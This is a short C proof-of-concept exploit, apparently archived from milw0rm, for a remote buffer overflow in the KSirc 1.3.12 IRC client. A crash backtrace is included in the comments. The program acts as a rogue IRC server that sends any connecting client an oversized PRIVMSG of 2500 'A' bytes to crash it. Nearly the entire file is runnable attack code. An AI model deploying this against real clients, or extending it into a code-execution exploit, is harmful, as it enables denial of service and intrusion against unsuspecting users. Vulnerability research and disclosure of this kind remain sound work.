// KSirc 1.3.12 - PRIVMSG remote Buffer Overflow // PoC
//
// Federico L. Bossi Bonin 
// fbossi@globalst.com.ar
// www.GlobalST.com.ar


// #0  0xb7ea8792 in KSircIOController::stdout_read () from /usr/kde/3.5/lib/libkdeinit_ksirc.so
// #1  0xb7ea78c8 in KSircIOController::qt_invoke () from /usr/kde/3.5/lib/libkdeinit_ksirc.so
// #2  0xb6fedba4 in QObject::activate_signal () from /usr/qt/3/lib/libqt-mt.so.3
// #3  0xb765410b in KProcess::receivedStdout () from /usr/kde/3.5/lib/libkdecore.so.4
// #4  0x081a6e60 in ?? ()
// #5  0x081a7238 in ?? ()
// #6  0xbfcb0170 in ?? ()
// #7  0x00000000 in ?? ()

#include <stdio.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>

#define PORT 6667
#define LEN 2500

char buffer[LEN*2];
void sendbuff(int sock) {
char ptr[LEN*2];
memset(buffer,0x0,sizeof(buffer));
memset(ptr,0x0,sizeof(ptr));
memset(ptr,0x41,LEN);
sprintf(buffer,"PRIVMSG  USER:%s\n\r",ptr);
read(sock,ptr,sizeof(ptr));
write(sock,buffer,sizeof(buffer));
}

int main() {
struct sockaddr_in srv_addr, client;
int len,pid,sockfd,sock;

sockfd = socket(AF_INET, SOCK_STREAM, 0);

if (sockfd < 0) { 
perror("error socket()"); 
exit(1);
}
     
bzero((char *) &srv_addr, sizeof(srv_addr));
srv_addr.sin_family = AF_INET;
srv_addr.sin_addr.s_addr = INADDR_ANY;
srv_addr.sin_port = htons(PORT);

if (bind(sockfd, (struct sockaddr *) &srv_addr,sizeof(srv_addr)) < 0)  {
perror("error bind()");
exit(1);
}


printf("KSirc 1.3.12 - PRIVMSG remote PoC\n");
printf("====================================\n");
printf("Listening on port %i\n",PORT);

listen(sockfd,5);
len = sizeof(client);

while (1) {
sock = accept(sockfd, (struct sockaddr *) &client, &len);
if (sock < 0)  {
perror("error accept()");
exit(1);
}

pid = fork();
if (pid < 0)  {
perror("fork()");
exit(1);
}
if (pid == 0)  {
close(sockfd);
printf("Conection from %s\n",inet_ntoa(client.sin_addr));
sendbuff(sock);
exit(0);
}
else close(sock);
} 
return 0;
}

// milw0rm.com [2006-12-26]